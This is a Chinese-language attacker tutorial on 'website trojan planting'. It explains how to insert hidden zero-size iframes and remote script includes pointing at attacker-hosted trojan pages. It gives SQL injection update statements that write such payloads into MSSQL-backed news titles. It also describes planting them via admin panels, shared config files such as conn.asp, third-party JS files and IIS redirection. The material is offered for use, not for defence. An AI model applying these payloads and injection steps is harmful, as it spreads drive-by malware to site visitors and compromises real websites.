@@ -1,0 +1,64 @@
+1  	  网站挂马渗透技术(慎用,仅供参考)
+	
+    总结我们一路走来的经历，不难发现多多少少漏出了不少.
+    技术的提高带来的更多的Webshell..连NB服务器都拿下了不少...
+    当然木马也就患难了....
+============================================= 
+　　普通法：(Iframe用法详解 — http://zhidao.baidu.com/question/6079225.html?si=2)
+　　一普通的挂马的都是用框架，这是最基本的挂马方式，那就想插入哪里就写哪里了
+  最基本的语句当然是
+  <iframe src=http://www.xxxx.com/muma.htm width=0 height=0></iframe>
+    其中http://www.xxxx.com/muma.htm是我们的木马
+
+  Js法:
+　　上面可能是一般的挂马方式，初学者的玩法，好了，再说深一点点的，那就是js文件，现在好多网站都调有了JS
+    其中的语句是：
+  <script language=javascript src=./xxxx.js></script>，想到了什么，这里也可以挂马，其中我们可以远程调用自己的js
+
+    比如:<script language=javascript src=http://www.xxxx.com/muma.js></script>
+    这个muma.js就可以写木马了，怎么写呢，同样，我们还用最基本的iframe框架，不过在<script></script>之中可识别语言不是html,js文件可以这样写:
+    document.write("<iframe <iframe src=http://www.xxxx.com/muma.htm width=0 height=0></iframe>");
+
+    这种形式，这时就可以执行此js中的代码了，当然了，说白了，其实全语句就是
+  <script language=javascript>document.write("<iframe <iframe src=http://www.fucksb.net/mm.htm width=0 height=0></iframe>")</script>
+  Js技巧:
+
+　　<script></script>之中，无论什么后缀的文件，只要里面写的语句可以被javascript识别就会执行，比如<script src=http://www.xxxx.com/mm.ooaa></script>
+          <script src=http://www.xxxx.com/mumma.haha></script>
+
+  不管后缀是什么了 都可以执行...
+  同样，如果首页调用其它网站，或者次级目录中的Html,Asp等
+  例:<iframe src=./about/nihao.htm width=200 height=100></iframe>
+也可以在nihao.htm文件里挂马，可以是htm和js，随便哪种，这种比较隐蔽，适用于主页没有写权限时利用。
+  
+　 <script>于<iframe>比较
+  貌似script整体挂马的代码长度比iframe小得多，说实用是在数据库方面，下面介绍。数据库挂马，这里我们拿mssql数据库为例子。
+
+　　这里说的是首页调用到的数据库，比如新闻，论坛，公告，等等，一般是标题。     
+  举个例子，比如首页有一条新闻为：“今日报道”，那么鼠标点此新闻，地址栏打开的新窗口为news.asp?id=XX，这种情况，这时，就可以判断此新闻是从数据库中调用的了，当然了，我们不说access，只说mssql。
+
+　　首页，我们要有这个网站中的一个注入点，比如就点在music.asp?id=1，同时，至少是Db_Owner权限，这时如果要挂马可以不用取到webshell，因为如果我们的目的只在于挂马的话，而且有时，还得检测mssql数据库和web服务器不在同一个机器上，那挂马的方式就是更改数据库内容，这里我说的就是这种，如上面说的，首页显示的一条新闻标题为“今日报道”，如果首页显示的标题是“今日报道</a><iframe src=http://www.xxxx.com/muma.htm width=0 height=0></iframe>”，那这样的话，首页就会执行这段代码了，像这种情况，找到了注入点，就得找表名，如此新闻的表名为news，字段为title，ID等等，根据猜测 ' and1=1 ……
+
+  暴出的字段title的值就为“今日报道”，那么90%就可以猜到了，首页调用的数据库的字段就为news表中的title，这时在注入点，可以大胆提交music.asp?id=xxx;update news set title='今日报道</a>< iframe src=http://www.xxxx.com/muma.htmwidth=0 height=0></iframe>' where id=1;
+
+    这样就可以更改数据库了，前提是最少要少Db_Owner权限，当然也有时由于代码原因，也可以这样提交:Music.asp?id=xxx';update news set title='今日开夜</a><ifrmae src=http://www.xxxx.com/muma.htm width=0 height=0></iframe>' where id=1 and '1'='1 等等……
+
+　　这种方法是有问题的，实战中存在不少问题，因为一般的情况下，标题都是通过<table>来限制宽度，也就是说如果你的标题的长度超过了指定的长度，那么你的代码只能写一半，这样就不能执行了，所以挂马最好的方法是用<script>这种方法来挂马了，如:
+music.asp?id=xxx;update news set title='今日报道</a><script src=http://www.xxxx.com.muma.htm></script>' where id=1;--长度有很大的减少，很不错。
+
+  后台挂马法:
+  通常拿不到webshell，就只能靠进后台挂马。
+
+  这里说的是进入了后台，但不能通过后台得到webshell，这时要仔细关察后台，像比较网站的链接、顶部底部的广告、都可以直接写入你的木马代码，等等，后台是灵活的，具体问题具体分析。不过有一点很重要，是不要打乱前台htm源文件里的代码逻辑，比如应该闭合前面的<a><img>"( 等这些符号，应该先闭合掉如</a></img>")。
+
+  其它形式
+
+  例如首页调用了<iframe src=music.asp?id=1&no=view width=100>< /iframe>此种形势，一样可以在music.asp中直接写入iframe木马代码，如果调用的是<script src=music.asp?id=1&no=view width=100></script>在 music.asp写代码时
+  请用document.write("")这种格式写入，当然，如果被挂文件中还有调用的文件可以继续往深处写，如果你够狠的话，直接写到数据库配置文件中，如conn.asp，这样好多页面可以同时挂上你的一种木马了。
+  当然这里也有js文件，一样原理。
+  挂一个网站的马，不一定就得攻入他，有时没有方法的同时，可以考虑跨站。好多站用了别的站的js文件，如:<script src=http://www.sohu.com/user.js>这种情势，这时就可以考虑只拿sohu.com的权限就行了，只要能修改到user.js文件就可以挂到你要挂的站点了，同理，也有<iframe src=http://www.sohu.com/user.htm>此种情况，一样道理，剑走偏锋，达到目的，无论用什么招数了。
+
+  服务器挂马法:
+  这里简单说一个比较狠的吧.重定向任何调用的htm，js,等文件，只要是执行的
+
+  这种方法在计算中用搜索搜索不到的，反正本地怎么找也找不到。只能在IIS里设置..而且调用文件那么多，怎么知道是重定向的那个文件呢？
